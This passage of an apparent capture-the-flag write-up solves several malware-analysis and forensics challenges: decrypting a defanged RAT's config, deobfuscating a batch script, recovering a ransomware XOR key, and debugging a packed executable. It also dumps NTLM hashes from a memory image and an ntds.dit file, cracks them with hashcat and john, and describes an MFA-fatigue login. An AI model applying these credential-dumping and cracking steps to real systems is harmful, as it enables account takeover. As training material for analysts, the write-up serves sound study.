I did the same the above.

```python
import base64

part1 = '2ec7627d{galf'[::-1]
part2 = base64.b64decode('NjIwM2I1Y2M2OWY0').decode()
part3 = ''.join([chr(ord(c1)^ord(c2)) for c1, c2 in zip('\x17*\x07`BC\x14*R@\x14^*', 'uKeVuzwIexplW')])
print(part1 + part2 + part3)
```

Got flag.

## RAT

### Description

> I was arguing with a co-worker on whether or not it is "Remote Access Tool" or "Remote Access Trojan", and he didn't agree with me, so I sent him this shady file ;)
>
> NOTE: Archive password: infected
>
> NOTE, this challenge is based off of a real malware sample. We have done our best to "defang" the code, but out of abudance of caution it is strongly encouraged you only analyze this inside of a virtual environment separate from any production devices.
>
> Download the file(s) below.
>
> Attachments: rat.7z

### Flag

flag{8b988b859588f2725f0c859104919019}

### Solution

Useful tools for this challenge:

- [dnSpy/dnSpy: .NET debugger and assembly editor](https://github.com/dnSpy/dnSpy)

In Windows Powershell:

```powershell
PS C:\Users\root\Desktop\huntressctf> 7za.exe e -pinfected .\rat.7z

7-Zip (a) 23.01 (x64) : Copyright (c) 1999-2023 Igor Pavlov : 2023-06-20
(snip)

PS C:\Users\root\Desktop\huntressctf> dir


    Directory: C:\Users\root\Desktop\huntressctf


Mode                 LastWriteTime         Length Name
----                 -------------         ------ ----
-a----         9/21/2023   5:14 PM         524502 rat
-a----        10/23/2023   6:42 PM         129474 rat.7z


PS C:\Users\root\Desktop\huntressctf> file rat
rat: PE32+ executable (GUI) x86-64 Mono/.Net assembly, for MS Windows
```

It generated `rat` file and this is PE32+ executable (GUI) x86-64 **Mono/.Net assembly**.
I used will [dnSpy](https://github.com/dnSpy/dnSpy) to decompile and debug it.

Opened dnSpy and File > Open, select `rat.exe` (I have renamed `rat` to `rat.exe`).
Looking at source code under the `PopITStub` assembly, I found `decrypt` method in `cry` class.
I'll try to save the array to return.

1. Set breakpoint to `return array;`

   ![RAT_dnspy_breakpoint.png](img/RAT_dnspy_breakpoint.png)

1. Run `Start` (press F5) and click `OK`

1. Right click `array` line and select Save to save `array` to file.
   Repeat this twice because this method is called twice.

   ![RAT_dnspy_save_array.png](img/RAT_dnspy_save_array.png)

Looking at the two saved files, these are also PE32+ mono files.

```console
PS C:\Users\root\Desktop\huntressctf> file .\tmp1.dat
.\tmp1.dat: PE32+ executable (DLL) (console) x86-64 Mono/.Net assembly, for MS Windows
PS C:\Users\root\Desktop\huntressctf> file .\tmp2.dat
.\tmp2.dat: PE32 executable (GUI) Intel 80386 Mono/.Net assembly, for MS Windows
```

Similarly, opened those file with dnSpy.
There is `Client` assembly in tmp2.exe (I renamed `tmp2.dat` to `tmp2.exe`) and looking at it.

```csharp
namespace Client
{
    // Token: 0x0200000C RID: 12
    public static class Settings
    {
        // Token: 0x06000054 RID: 84 RVA: 0x0000385C File Offset: 0x00001A5C
        public static bool InitializeSettings()
        {
            bool flag;
            try
            {
                Settings.Key = Encoding.UTF8.GetString(Convert.FromBase64String(Settings.Key));
                Settings.aes256 = new Aes256(Settings.Key);
                Settings.Por_ts = Settings.aes256.Decrypt(Settings.Por_ts);
                Settings.Hos_ts = Settings.aes256.Decrypt(Settings.Hos_ts);
                Settings.Ver_sion = Settings.aes256.Decrypt(Settings.Ver_sion);
                Settings.In_stall = Settings.aes256.Decrypt(Settings.In_stall);
                Settings.MTX = Settings.aes256.Decrypt(Settings.MTX);
                Settings.Paste_bin = Settings.aes256.Decrypt(Settings.Paste_bin);
                Settings.An_ti = Settings.aes256.Decrypt(Settings.An_ti);
                Settings.Anti_Process = Settings.aes256.Decrypt(Settings.Anti_Process);
                Settings.BS_OD = Settings.aes256.Decrypt(Settings.BS_OD);
                Settings.Group = Settings.aes256.Decrypt(Settings.Group);
                Settings.Hw_id = HwidGen.HWID();
                Settings.Server_signa_ture = Settings.aes256.Decrypt(Settings.Server_signa_ture);
                Settings.Server_Certificate = new X509Certificate2(Convert.FromBase64String(Settings.aes256.Decrypt(Settings.Certifi_cate)));
                flag = Settings.VerifyHash();
            }
            catch
            {
                flag = false;
            }
            return flag;
        }

        // (snip)
        // Token: 0x0400001B RID: 27
        public static string Por_ts = "bXGmOq5acG9CAtRKtRJkfqH5X5HLW67RlYyFZJ00/iG0/I1eqBXOR4870uo1QTcLGfpqwcbkWv8oFWIuQOXrBBRM/snjV/KU3AFXq+Y938Y=";
        // (snip)
        // Token: 0x04000025 RID: 37
        public static string Flag = "mZzroGSIkpZlwvCwLG0PHQMXzjphDowlbeBayjWJhmYPJ5KiQeUAbcv9SzTnLGpr3uYQ0VvZ02rGlxz71tOXMemdK1DKKY6uX2QfUJW+WlDPcLi1u48xBrhmDcpRaK1G";
```

In `Settings` class, `Flag` variable is not used anywhere, although other variables such as `Por_ts` are decrypted in the `InitializeSettings` method.
I'll try to get the decrypted `Flag` value.

1. Right click in `InitializeSettings` method and Select `Edit Class`
1. Add `Console.WriteLine(Settings.aes256.Decrypt(Settings.Flag));`

   ```csharp
                   Settings.Key = Encoding.UTF8.GetString(Convert.FromBase64String(Settings.Key));
                   Settings.aes256 = new Aes256(Settings.Key);
                   Console.WriteLine(Settings.aes256.Decrypt(Settings.Flag));  // append this
                   Settings.Por_ts = Settings.aes256.Decrypt(Settings.Por_ts);
   ```

1. Click Compile
1. In above menu, File > Save All and save as tmp22.exe
1. Open tmp22.exe in dnSpy
1. Set breakpoint to `Console.WriteLine(Settings.aes256.Decrypt(Settings.Flag));` and Start (F5)
1. Step Over (F10)

![RAT_flag.png](img/RAT_flag.png)

Got flag.

## Batchfuscation

### Description

> I was reading a report on past Trickbot malware, and I found this sample that looks a lot like their code! Can you make any sense of it?
>
> Download the file below.
>
> Attachments: batchfuscation

### Flag

flag{acad67e3d0b5bf31ac6639360db9d19a}

### Solution

- A lot of variable is defined with a random name in [set](https://learn.microsoft.com/en-us/windows-server/administration/windows-commands/set_1)
- Keep in replacing variable, I reach the flag

For example, L1 - L5:

```bat
1  @echo off
2  set bdevq=set
3  %bdevq% grfxdh=
4  %bdevq%%grfxdh%mbbzmk==
5  %bdevq%%grfxdh%xeegh%mbbzmk%/
```

- L2: `bdevq` is set to `set`, I can replace `%bdevq%` to `set`.
  Thus, L3 result is `set grfxdh=`.
- L3: there is space (` `) in last char, `grfxdh` is set to ` `.
  Thus, L4 result is `set mbbzmk==`.
- L4: `mbbzmk` is set to `=`.
  Thus, L5 result is `set xeegh=/`.
- L5: `xeegh` is set to `/`.

L15 - L17:

```bat
15 set /a bpquuu=4941956 %% 4941859
16 cmd /c exit %bpquuu%
17 set grtoy=%=exitcodeAscii%
```

- L15: `1bpquuu` is set to 97, which is the result of `4941956 % 4941859`
- L16: cmd.exe is newly executed and exits with exitcode 97
- L17: `grtoy` is set to `a` because `chr(97)` is `a`

Did repeatedly the above, the following flags will appear.
Concatenating them in order, got flag.

```bat
:: set flag_character34=d
(snip)
:: set flag_character20=3
```

solver.py

```python
def dump_result_and_return_lines(lines, mapping, save=False):
    data = "\n".join(lines)

    for k, v in mapping.items():
        data = data.replace(f"%{k}%", v)

    if save:
        with open("result.bat", "w") as f:
            f.write(data)

    lines = data.split("\n")
    return lines


def read_file():
    with open("batchfuscation", "r") as f:
        lines = f.read().splitlines()

    return lines


def get_flag(lines):
    # Looked at result.bar and search `flag` string, found `:: set flag_character`.
    # So parse and join them.
    flag_length = 38

    # init
    flag = ["" for _ in range(flag_length + 1)]

    for line in lines:
        if not line.startswith(":: set flag_character"):
            continue

        line = line.replace(":: set flag_character", "")

        k, v = line.split("=")
        flag[int(k)] = v

    return "".join(flag)


def create_replace_mapping(lines):
    mapping = {}

    # L2 - L4
    mapping["bdevq"] = "set"
    mapping["grfxdh"] = " "
    mapping["mbbzmk"] = "="

    lines = dump_result_and_return_lines(lines, mapping)

    # L5 - L14
    for i in range(4, 14):
        variable_name = lines[i][4:].split("=")[0]
        char = lines[i][-1]

        mapping[variable_name] = char

    lines = dump_result_and_return_lines(lines, mapping)

    # L15 - L224
    for i in range(14, 224, 3):
        formula = lines[i].split("=")[1].replace("%%", "%")
        char = chr(eval(formula))

        variable_name = lines[i + 2][4:].split("=")[0]

        mapping[variable_name] = char

    lines = dump_result_and_return_lines(lines, mapping)

    return lines


def main():
    lines = read_file()
    lines = create_replace_mapping(lines)
    flag = get_flag(lines)
    print(flag)


if __name__ == "__main__":
    main()
```

## Bad Memory

### Description

> A user came to us and said they forgot their password. Can you recover it? The flag is the MD5 hash of the recovered password wrapped in the proper flag format.
>
> Download the file below. Note, this is a large 600MB file and may take some time to download.
>
> Attachment: image.zip

### Flag

flag{2eb53da441962150ae7d3840444dfdde}

### Solution

Unzipped the attached `image.zip` file, I got `image.bin` file.
This file is identified as `data` by `file` command.
This challenge name is `Bad memory` and I guess this file is memory dump so used [volatility3](https://github.com/volatilityfoundation/volatility3).

```console
root@kali:~/ctf/HuntressCTF# python3 ~/tools/volatility3/vol.py -f image.bin windows.hashdump.Hashdump
Volatility 3 Framework 2.4.1
Progress:  100.00               PDB scanning finished
User    rid     lmhash  nthash

Administrator   500     aad3b435b51404eeaad3b435b51404ee        31d6cfe0d16ae931b73c59d7e0c089c0
Guest   501     aad3b435b51404eeaad3b435b51404ee        31d6cfe0d16ae931b73c59d7e0c089c0
DefaultAccount  503     aad3b435b51404eeaad3b435b51404ee        31d6cfe0d16ae931b73c59d7e0c089c0
WDAGUtilityAccount      504     aad3b435b51404eeaad3b435b51404ee        4cff1380be22a7b2e12d22ac19e2cdc0
congo   1001    aad3b435b51404eeaad3b435b51404ee        ab395607d3779239b83eed9906b4fb92

root@kali:~/ctf/HuntressCTF# hashcat -m 1000 ab395607d3779239b83eed9906b4fb92 /usr/share/wordlists/rockyou.txt
hashcat (v6.2.6) starting

(snip)

ab395607d3779239b83eed9906b4fb92:goldfish#

(snip)

root@kali:~/ctf/HuntressCTF# echo -ne 'goldfish#' | md5sum
2eb53da441962150ae7d3840444dfdde  -
```

Flag is `flag{2eb53da441962150ae7d3840444dfdde}`.

FYI: I also used [volatility2](https://github.com/volatilityfoundation/volatility), but I could not crack the got hashdump.

## Discord Snowflake Scramble

### Description

> Someone sent message on a Discord server which contains a flag! They did mention something about being able to embed a list of online users on their own website...
>
> Can you figure out how to join that Discord server and see the message?
>
> Note: Discord phone verification is NOT required for this challenge.
>
> Connect here: <https://discord.com/channels/1156647699362361364/1156648139516817519/1156648284237074552>

### Flag

flag{bb1dcf163212c54317daa7d1d5d0ce35}

### Solution

> They did mention something about being able to embed a list of online users on their own website

I think this is Discord iframe such as the following:

![Discord_Snowflake_Scramble_userlist.png](img/Discord_Snowflake_Scramble_userlist.png)

Google search [`discord iframe embed url`](https://www.google.com/search?hl=en&q=discord+iframe+embed+url), found [CodePen's Advanced Discord Iframe](https://codepen.io/Syera/pen/wvBZrBr).
This page has the iframe link `https://discordapp.com/widget?id=serverid&theme=dark`.
The provided Discord link in this challenge is `https://discord.com/channels/1156647699362361364/...`, and therefore the correct iframe link for this challenge is `https://discordapp.com/widget?id=1156647699362361364&theme=dark`.

Accessed to <https://discordapp.com/widget?id=1156647699362361364&theme=dark> and clicked `Join Discord` button.
Successed to join the Discord Server.
Got flag in #flag channel.

![Discord_Snowflake_Scramble_flag.png](img/Discord_Snowflake_Scramble_flag.png)

## BlackCat

### Description

> We've been hit by the infamous BlackCat Ransomware Group! We need you to help restore the encrypted files. Please help! My favorite rock got encrypted and I'm a wreck right now!
>
> Archive password: infected
>
> NOTE, this challenge is based off of a real malware sample. Windows Defender will probably identify it as malicious. It is strongly encouraged you only analyze this inside of a virtual environment separate from any production devices.
>
> Download the file(s) below.
>
> Attachments: blackcat.7z

### Flag

flag{092744b55420033c5eb9d609eac5e823}

### Solution

Looking at how the file of `.encry` extension is decryped.

```powershell
PS C:\Users\root\Desktop\huntressctf\blackcat> echo "AAAAAAAAAAAAAAAAAAAA" | Out-File -Encoding ASCII .\victim-files\test.txt.encry
PS C:\Users\root\Desktop\huntressctf\blackcat> Format-Hex -Path .\victim-files\test.txt.encry


           Path: C:\Users\root\Desktop\huntressctf\blackcat\victim-files\test.txt.encry

           00 01 02 03 04 05 06 07 08 09 0A 0B 0C 0D 0E 0F

00000000   41 41 41 41 41 41 41 41 41 41 41 41 41 41 41 41  AAAAAAAAAAAAAAAA
00000010   41 41 41 41 0D 0A                                AAAA..

PS C:\Users\root\Desktop\huntressctf\blackcat> .\DecryptMyFiles.exe

____  _               _____ _  __   _____       _______
|  _ \| |        /\   / ____| |/ /  / ____|   /\|__   __|
| |_) | |       /  \ | |    | ' /  | |       /  \  | |
|  _ <| |      / /\ \| |    |  <   | |      / /\ \ | |
| |_) | |____ / ____ \ |____| . \  | |____ / ____ \| |
|____/|______/_/    \_\_____|_|\_\  \_____/_/    \_\_|

Ransomware Group File Decryptor Utility | v1.8.2 | Release Codename: Jiji


[*] Once you have paid us, our world-class customer service desk will provide you with a key to decrypt your files.
[*] Enter the ransomware key to decrypt your files > ABCDEFGH
[+] Decryption completed for victim-files\Bliss_Windows_XP.png.encry
[+] Decryption completed for victim-files\Huntress-Labs-Logo-and-Text-Black.png.encry
[+] Decryption completed for victim-files\flag.txt.encry
[+] Decryption completed for victim-files\my-favorite-rock.jpg.encry
[+] Decryption completed for victim-files\test.txt.encry
[+] Decryption completed for victim-files\the-entire-text-of-hamlet.txt.encry
PS C:\Users\root\Desktop\huntressctf\blackcat> Format-Hex -Path .\victim-files\test.txt.decry


           Path: C:\Users\root\Desktop\huntressctf\blackcat\victim-files\test.txt.decry

           00 01 02 03 04 05 06 07 08 09 0A 0B 0C 0D 0E 0F

00000000   00 03 02 05 04 07 06 09 00 03 02 05 04 07 06 09  ................
00000010   00 03 02 05 48 4C                                ....HL
```

```python
>>> hex(ord('A') ^ ord('B'))
'0x3'
>>> hex(ord('A') ^ ord('C'))
'0x2'
>>> hex(ord('A') ^ ord('D'))
'0x5'
>>> hex(ord('A') ^ ord('E'))
'0x4'
```

It's XOR encription.
The XOR key length is 8 bytes, since the `00 03 02 05 04 07 06 09` is repeated.
But I don't know the XOR key so calculate it.

There is PNG encrypted file named `victim-files\Bliss_Windows_XP.png.encry` and PNG file signature is `89 50 4E 47 0D 0A 1A 0A`.

[List of file signatures - Wikipedia](https://en.wikipedia.org/wiki/List_of_file_signatures)

> 89 50 4E 47 0D 0A 1A 0A ‰PNG␍␊␚␊ 0 png Image encoded in the Portable Network Graphics format[21]

```powershell
PS C:\Users\root\Desktop\huntressctf\blackcat> Format-Hex -Path .\victim-files\Bliss_Windows_XP.png.encry |select -first 1


           Path: C:\Users\root\Desktop\huntressctf\blackcat\victim-files\Bliss_Windows_XP.png.encry

           00 01 02 03 04 05 06 07 08 09 0A 0B 0C 0D 0E 0F

00000000   EA 3F 3D 2A 62 68 75 63 63 6F 73 60 26 2A 2B 3B  ê?=*bhuccos`&*+;
```

XORed `EA 3F 3D 2A 62 68 75 63` with PNG file signature `89 50 4E 47 0D 0A 1A 0A,`since the file header 8 bytes is `EA 3F 3D 2A 62 68 75 63`.

```python
>>> ''.join([hex(x ^ y)[2:] for x, y in zip([0xea, 0x3f, 0x3d, 0x2a, 0x62, 0x68, 0x75, 0x63], [0x89, 0x50, 0x4E, 0x47, 0x0D, 0x0A, 0x1A, 0x0A])])
'636f736d6f626f69'
```

XOR key is `636f736d6f626f69`.
I used CyberChef to XOR decript to decrypt `victim-files\flag.txt.encry`.

[XOR - CyberChef](https://gchq.github.io/CyberChef/#recipe=XOR%28%7B'option':'Hex','string':'636f736d6f626f69'%7D,'Standard',false%29&input=KAoWHQYMCEkOFlMLAwMISQsKAQhPEQBJChtUHk8RDg8GTnlnCQ4ODhhfSl9YVlsLVlpHX19SXFoAWhYPVgZZWVoKEg5aB1dbUBI)

> Keeping my flag here so it's safe!
>
> flag{092744b55420033c5eb9d609eac5e823}

Got flag.

## MFAtigue

### Description

> We got our hands on an NTDS file, and we might be able to break into the Azure Admin account! Can you track it down and try to log in? They might have MFA set up though...
>
> Download the file(s) below and press the Start button on the top-right to begin this challenge.
>
> Attachments: NTDS.zip

### Flag

flag{9b896a677de35d7dfa715a05c25ef89e}

### Solution

```console
$ unzip NTDS.zip
Archive:  NTDS.zip
  inflating: ntds.dit
  inflating: SYSTEM

$ file ntds.dit SYSTEM
ntds.dit: Extensible storage engine DataBase, version 0x620, checksum 0x1d1fabe5, page size 8192, Windows version 10.0
SYSTEM:   MS Windows registry file, NT/2000 or above
```

Dump NTLM password hash by using [impacket-secretsdump](https://github.com/fortra/impacket/blob/master/examples/secretsdump.py).

```console
$ impacket-secretsdump -system SYSTEM -ntds ntds.dit -outputfile hashes local
Impacket v0.11.0 - Copyright 2023 Fortra
(snip)



$ john --format=NT hashes.ntds
(snip)
katlyn99         (huntressctf.local\JILLIAN_DOTSON)
(snip)

$ # or I can use hashcat instead

$ cut -d':' -f4 hashes.ntds > hashes.ntlm.txt

$ hashcat -m 1000 hashes.ntlm.txt /usr/share/wordlists/rockyou.txt
hashcat (v6.2.6) starting
(snip)

$ hashcat -m 1000 hashes.ntlm.txt /usr/share/wordlists/rockyou.txt --show
31d6cfe0d16ae931b73c59d7e0c089c0:
08e75cc7ee80ff06f77c3e54cadab42a:katlyn99

$ grep 08e75cc7ee80ff06f77c3e54cadab42a hashes.ntds
huntressctf.local\JILLIAN_DOTSON:1113:aad3b435b51404eeaad3b435b51404ee:08e75cc7ee80ff06f77c3e54cadab42a:::
```

Got the `huntressctf\JILLIAN_DOTSON:katlyn99` credential.

Accessed this challenge URL and entered `huntressctf.local\JILLIAN_DOTSON` for username, but it showed `Login domain 'huntressctf\' must be specified.` and failed.

![MFAtigue_failuser.png](img/MFAtigue_failuser.png)

Next, entered `huntressctf\JILLIAN_DOTSON` (without `.local`) for username and `katlyn99` for password, then it showed `Approve sign in request`.

![MFAtigue_require_MFA.png](img/MFAtigue_require_MFA.png)

Looked at source code.
When accessing /mfa, it seems I can get the flag if the user has authenticated.

```html
<script>
    $(document).ready(function() {
        $('#submitBtn').click(function(event) {
            event.preventDefault();

            $.notify("Push notification sent!", "success");

            setTimeout(function() {
                $.post("/mfa", function(data) {
                    if(data === "authenticated") {
                        window.location.href = "/flag";
                    }
                });
            }, 500);
        });
    });
</script>
```

This challenge name is MFAtigue and I guessed the name is maked a play on [MFA Fatigue](https://en.wikipedia.org/wiki/Multi-factor_authentication_fatigue_attack).
Clicked `Send Push Notification` button repeatedly, Got flag.

![MFAtigue_flag.png](img/MFAtigue_flag.png)

## Snake Eater II

### Description

> Snake Eater II - Revenge of the Snake Eater
>
> The Threat Actor must have gotten word that you had no trouble dissecting Snake Eater. They said this one is a bit more... involved.
>
> Archive Password: infected
>
> Download the file(s) below.
> Attachments: snake_eaterII.7z

### Flag

flag{be47387ab77251ecf80db1b6725dd7ac}

### Solution

I extracted the attached snake_eaterII.7z file and got snake_eaterII.exe file.
Because this file is the executable file generated PyInstaller, I used [pyinstxtractor](https://github.com/extremecoders-re/pyinstxtractor) as well as the previous challenge Snake Oil to look at the source code.
But this source code was obfuscated by [PyArmor](https://github.com/dashingsoft/pyarmor) and I didn't know how to deobfuscate it.
Thus, I will try Dynamic Analysis instead of Static Analysis to get the flag.

First, I used the [Proces Monitor (Procmon)](https://learn.microsoft.com/en-us/sysinternals/downloads/procmon) to look at what this executable does.

Opened the Procmon and added the filter as "`Process Name` `is` `snake_eaterII.exe` then `Include`", I executed snake_eaterII.exe.
Then, I got the event called `Operation: CreateFile, Path: C:\Users\root\AppData\Roaming\Microsoft\Windows\PowerShell\flag.txt`.
The flag.txt is interesting file.

Clicked this event and opened Stack tab, I confirmed CreateFileW is called in `C:\Windows\System32\KernelBase.dll`.
flag.txt file is created in this event.

![Snake_Eater_II_CreateFileW.png](img/Snake_Eater_II_CreateFileW.png)

Looked at an after events, I confirmed the `Operation: CreateFile, Path: C:\Users\root\AppData\Roaming\Microsoft\Windows\PowerShell\flag.txt` event.
However, DeleteFileW was called unlike before.
I think this event is to delete file, therefore, the flag.txt file is immediately deleted after it was created.
Actually, after the execution of snake_eaterII.exe was completed, I looked at the folder where this file was created, but there was not flag.txt file.

![Snake_Eater_II_DeleteFileW.png](img/Snake_Eater_II_DeleteFileW.png)

Furthermore, executed snake_eaterII.exe several times, I confirmed that flag.txt was created in a different folder.
It seems that the folder where flag.txt is created is not fixed.

Because the flag.txt will be deleted soon after created, I will try to get the flag.txt before being deleted by using debugger.

First, I opened [x64dbg](https://x64dbg.com/) (hereinafter this window is called x64dbg 1), opened snake_eaterII.exe.
And executed it several times to see what was being processed, by using such as Step into (F7), Step over (F8) and Execute till return (Ctrl+F9).
Then, I confirmed ntdll.dll.NTResumeThread was called and the flag.txt file was created in this thread.

Since I debug another thread with another x64dbg, I will try to set a breakpoint before ntdll.dll.NTResumeThread.
ntdll.dll.NTResumeThread is called by the syscall instruction in the `00007FFCB576DA22` address, so I set a breakpoint at `00007FFCB576DA10` address.

![Snake_Eater_II_set_breakpoint.png](img/Snake_Eater_II_set_breakpoint.png)

I run until this breakpoint in x64dbg 1.
And I opened another x64dbg (hereinafter called x64dbg 2) and attached the suspended process.

![Snake_Eater_II_attach_process.png](img/Snake_Eater_II_attach_process.png)

Then I stepped over until the `syscall` was executed in x64dbg 1.
And I proceeded with the steps below.

1. In x64dbg 2, right click Disassembly Window and `Search for` > `All Modules` > `Intermodular calls`
1. Enter `WriteFile` in the `Search:` form
1. Select all displayed addresses, right click and select `Set breakpoint on all commands`
1. Return to x64dbg 2 CPU tab
   ![Snake_Eater_II_set_breakpoint_WriteFile.png](img/Snake_Eater_II_set_breakpoint_WriteFile.png)
1. Continue Run or Step Over until flag.txt `WriteFile` completes in Process Monitor

![Snake_Eater_II_flag.png](img/Snake_Eater_II_flag.png)

got flag.
